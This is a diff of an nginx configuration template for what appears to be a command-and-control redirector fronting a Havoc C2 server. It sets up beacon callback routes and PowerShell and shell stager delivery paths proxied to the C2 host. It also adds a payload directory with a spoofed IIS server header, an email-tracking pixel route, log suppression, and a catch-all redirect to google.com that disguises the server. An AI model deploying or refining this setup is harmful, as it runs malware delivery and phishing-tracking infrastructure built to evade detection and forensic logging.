@@ -30,39 +30,16 @@ server {
         try_files $uri $uri/ =404;
     }
     
-    # Havoc C2 HTTP listener paths (replacing Sliver /ajax/ paths)
-    location ~ ^/api/v[12]/ {
-        proxy_pass http://{{ c2_ip }}:{{ havoc_http_port | default(8080) }};
-        proxy_http_version 1.1;
-        proxy_set_header Host $host;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection "upgrade";
-    }
-    
-    # Havoc C2 dashboard and content paths
-    location ~ ^/(dashboard|content)/ {
+    # Only expose beacon callback paths - NOT dashboard or admin functions
+    location ~ ^/api/beacon/ {
         proxy_pass https://{{ c2_ip }}:{{ havoc_https_port | default(443) }};
         proxy_http_version 1.1;
         proxy_set_header Host $host;
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
         proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection "upgrade";
-        proxy_ssl_verify off;
     }
     
-    # Havoc static resources path (replacing Sliver /static/ path)
-    location ~ ^/static/(css|js|images)/.*\.(css|js|png|jpg|jpeg|gif|ico)$ {
-        proxy_pass http://{{ c2_ip }}:{{ havoc_http_port | default(8080) }};
-        proxy_http_version 1.1;
-        proxy_set_header Host $host;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Real-IP $remote_addr;
-    }
-    
-    # Payload stager paths for Havoc
+    # Secure stager delivery routes
     location ~ ^/(windows|linux)_stager\.(ps1|sh)$ {
         proxy_pass http://{{ c2_ip }}:8443/$1_stager.$2;
         proxy_http_version 1.1;
@@ -70,8 +47,8 @@ server {
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
         proxy_set_header X-Real-IP $remote_addr;
     }
-
-    # Payload content paths for Havoc
+    
+    # Content access for payload delivery
     location ~ ^/content/(windows|linux)/(.+)$ {
         proxy_pass http://{{ c2_ip }}:8443/content/$1/$2;
         proxy_http_version 1.1;
@@ -79,26 +56,32 @@ server {
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
         proxy_set_header X-Real-IP $remote_addr;
     }
-    
-    {% if setup_integrated_tracker | default(false) | bool %}
-    # Email tracker proxy settings
-    location /track/ {
-        proxy_pass http://{{ c2_ip }}:5000/;
-        proxy_http_version 1.1;
-        proxy_set_header Host {{ tracker_domain }};
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-Proto https;
+
+    # Secure payload delivery path for synced payloads
+    location /payloads/ {
+        alias /var/www/payloads/;
+        limit_except GET { deny all; }
+        add_header X-Content-Type-Options "nosniff" always;
+        add_header Content-Security-Policy "default-src 'none'" always;
+        add_header X-Frame-Options "DENY" always;
+        add_header Server "Microsoft-IIS/10.0" always;
+        autoindex off;
+        access_log off;
     }
     
-    # Tracking pixel specific location
-    location /px.png {
-        proxy_pass http://{{ c2_ip }}:5000/pixel.png;
+    {% if setup_integrated_tracker | default(false) | bool %}
+    # Email tracker pixel only (not exposing dashboard)
+    location ~ ^/px/(.+)\.png$ {
+        proxy_pass http://{{ c2_ip }}:5000/pixel/$1.png;
         proxy_http_version 1.1;
         proxy_set_header Host {{ tracker_domain }};
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
         proxy_set_header X-Real-IP $remote_addr;
         proxy_set_header X-Forwarded-Proto https;
+        
+        # Cache control for tracking pixels
+        add_header Cache-Control "no-store, no-cache, must-revalidate" always;
+        expires -1;
     }
     {% endif %}
 
@@ -109,28 +92,25 @@ server {
     add_header Referrer-Policy "no-referrer" always;
     add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;" always;
     
-    # Disable logging for this server block if zero-logs is enabled
+    # Disable logging
     {% if zero_logs | default(true) | bool %}
     access_log off;
     error_log /dev/null crit;
     {% endif %}
 }
 
-# Catch-all server block to respond to unknown hosts
+# Catch-all server block
 server {
     listen 80 default_server;
     listen [::]:80 default_server;
     listen 443 ssl default_server;
     listen [::]:443 ssl default_server;
     
-    # Self-signed cert for catch-all
     ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
     ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
     
-    # Redirect all unknown traffic to a legitimate-looking site
     return 301 https://www.google.com;
     
-    # Disable logs
     access_log off;
     error_log /dev/null crit;
 }
